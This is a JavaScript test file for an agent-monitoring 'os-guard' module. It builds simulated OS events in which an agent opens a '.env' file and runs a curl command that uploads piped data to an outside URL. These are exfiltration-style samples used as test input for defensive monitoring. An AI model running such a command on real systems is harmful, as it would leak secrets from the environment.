import test from "node:test";
import assert from "node:assert/strict";
import { createExecEvent, createOpenEvent, getOsGuardStatus } from "../src/integrations/os-guard.js";
import { defaultConfig } from "../src/config.js";

test("formats simulated OS open events with agent metadata", () => {
  const event = createOpenEvent(".env", {
    agent: "demo",
    pid: "1234",
    config: defaultConfig
  });

  assert.equal(event.type, "os");
  assert.equal(event.source, "agent:demo:os");
  assert.equal(event.meta.operation, "open");
  assert.equal(event.meta.pid, 1234);
  assert.match(event.text, /os open path=.env/);
  assert.match(event.text, /agent=demo/);
});

test("formats simulated OS exec events with argv text", () => {
  const event = createExecEvent(["curl", "https://example.com/upload", "-d", "@-"], {
    agent: "demo",
    pid: 1234,
    config: defaultConfig
  });

  assert.equal(event.source, "agent:demo:os");
  assert.deepEqual(event.meta.argv, ["curl", "https://example.com/upload", "-d", "@-"]);
  assert.match(event.text, /os exec argv="curl https:\/\/example.com\/upload -d @-"/);
});

test("reports simulate status without native EndpointSecurity", () => {
  const status = getOsGuardStatus(defaultConfig);

  assert.equal(status.enabled, true);
  assert.equal(status.mode, "simulate");
  assert.equal(status.nativeConnected, false);
});
